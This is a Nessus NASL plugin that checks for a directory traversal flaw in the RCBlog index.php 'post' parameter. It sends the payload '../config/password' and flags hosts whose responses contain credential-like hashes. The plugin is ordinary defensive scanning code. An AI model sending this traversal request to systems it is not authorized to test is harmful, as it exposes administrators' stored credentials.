#%NASL_MIN_LEVEL 70300
#
# Josh Zlatin-Amishav josh at ramat dot cc
# GPLv2
#

# Changes by Tenable:
# - reduced the likehood of false positives
# - updated plugin title, enhanced description (4/1/2009)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20825);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-0370", "CVE-2006-0371");
  script_bugtraq_id(16342);

  script_name(english:"RCBlog index.php post Parameter Traversal Arbitrary File Access");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to directory 
traversal attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running RCBlog, a blog written in PHP. 

The remote version of this software fails to sanitize user-supplied
input to the 'post' parameter of the 'index.php' script.  An attacker
can use this to access arbitrary files on the remote host provided
PHP's 'magic_quotes' setting is disabled or, regardless of that
setting, files with a '.txt' extension such as those used by the
application to store administrative credentials. 

In addition, it has also been reported to be vulnerable to a user
account enumeration weakness, although Nessus has not checked it.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/422499");
  script_set_attribute(attribute:"solution", value:
"Remove the application as its author no longer supports it.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/01/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/01/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:noah_medling:rcblog");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"Copyright (C) 2006-2022 Josh Zlatin-Amishav");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80, embedded:TRUE);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if(!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/rcblog", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

file = "../config/password";
foreach dir ( dirs )
{
  req = http_get(
    item:string(
      dir, "/index.php?",
      "post=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like it worked.
  if (
    string(file, " not found.</div>") >!< res &&
    'powered by <a href="http://www.fluffington.com/">RCBlog' >< res &&
    egrep(pattern:'<div class="title">[a-f0-9]{32}\t[a-f0-9]{32}</div>', string:res)
  ) {
    security_warning(port);
    exit(0);
  }
}
